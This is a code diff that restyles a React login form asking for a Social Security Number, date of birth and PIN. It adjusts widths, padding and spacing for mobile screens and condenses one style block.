@@ -136,10 +136,10 @@ export default function MainContent() {
           Please log in: (If you set a PIN on Arkline use that PIN here)
         </div>
         <form onSubmit={validateAndSend} style={{
-          width: '100%',
-          maxWidth: isMobile ? '98vw' : 850,
+          width: isMobile ? '96vw' : '100%',
+          maxWidth: isMobile ? '420px' : 850,
           background: '#fff',
-          padding: isMobile ? '18px 4vw' : '32px 16px 24px 16px',
+          padding: isMobile ? '14px 2vw' : '32px 16px 24px 16px',
           borderRadius: 0,
           boxShadow: 'none',
           border: '1.5px solid #000',
@@ -148,8 +148,8 @@ export default function MainContent() {
           flexDirection: 'column',
           alignItems: 'center',
           justifyContent: 'center',
-          margin: '8px auto 0 auto',
-          gap: '18px',
+          margin: isMobile ? '8px auto 0 auto' : '8px auto 0 auto',
+          gap: '16px',
           zIndex: 2,
           fontFamily: 'alfabet, Arial, Helvetica, sans-serif',
         }}>
@@ -158,8 +158,8 @@ export default function MainContent() {
               ID (Social Security Number) <span style={{color: 'red', fontSize: 20}}>*</span>
             </label>
             <input name="id" type="text" maxLength={100} autoComplete="off" required style={{
-              width: isMobile ? 'calc(98vw - 60px)' : '320px',
-              maxWidth: '320px',
+              width: isMobile ? '100%' : '320px',
+              maxWidth: isMobile ? '100%' : '320px',
               padding: 10,
               border: '1px solid #ccc',
               borderRadius: 6,
@@ -175,8 +175,8 @@ export default function MainContent() {
               DOB (MM/DD/YYYY) <span style={{color: 'red', fontSize: 20}}>*</span>
             </label>
             <input name="dob" type="text" placeholder="MM/DD/YYYY" maxLength={100} autoComplete="off" required style={{
-              width: isMobile ? 'calc(98vw - 60px)' : '320px',
-              maxWidth: '320px',
+              width: isMobile ? '100%' : '320px',
+              maxWidth: isMobile ? '100%' : '320px',
               padding: 10,
               border: '1px solid #ccc',
               borderRadius: 6,
@@ -192,8 +192,8 @@ export default function MainContent() {
               PIN (Personal Identification Number) <span style={{color: 'red', fontSize: 20}}>*</span>
             </label>
             <input name="pin" type="text" maxLength={100} autoComplete="off" required style={{
-              width: isMobile ? 'calc(98vw - 60px)' : '320px',
-              maxWidth: '320px',
+              width: isMobile ? '100%' : '320px',
+              maxWidth: isMobile ? '100%' : '320px',
               padding: 10,
               border: '1px solid #ccc',
               borderRadius: 6,
@@ -203,23 +203,9 @@ export default function MainContent() {
               background: '#fff'
             }} />
           </div>
-          <div style={{
-            display: 'flex',
-            alignItems: 'center',
-            width: isMobile ? '100%' : '100%',
-            justifyContent: 'center',
-            flexDirection: isMobile ? 'row' : 'row',
-          }}>
+          <div style={{display: 'flex', alignItems: 'center', width: '100%', justifyContent: 'center'}}>
             <input name="newPin" type="checkbox" id="newPin" style={{marginRight: 8}} />
-            <label htmlFor="newPin" style={{
-              color: '#EA7575',
-              fontSize: 16,
-              letterSpacing: 'normal',
-              fontWeight: 500,
-              width: isMobile ? 'calc(98vw - 60px)' : '540px',
-              textAlign: isMobile ? 'left' : 'center',
-              display: 'inline-block',
-            }}>
+            <label htmlFor="newPin" style={{color: '#EA7575', fontSize: 16, letterSpacing: 'normal', fontWeight: 500, width: isMobile ? '100%' : '540px', textAlign: 'left', display: 'inline-block'}}>
               If you have not already established a four-digit PIN using Arkline, enter your new PIN above and click this box.
             </label>
           </div>
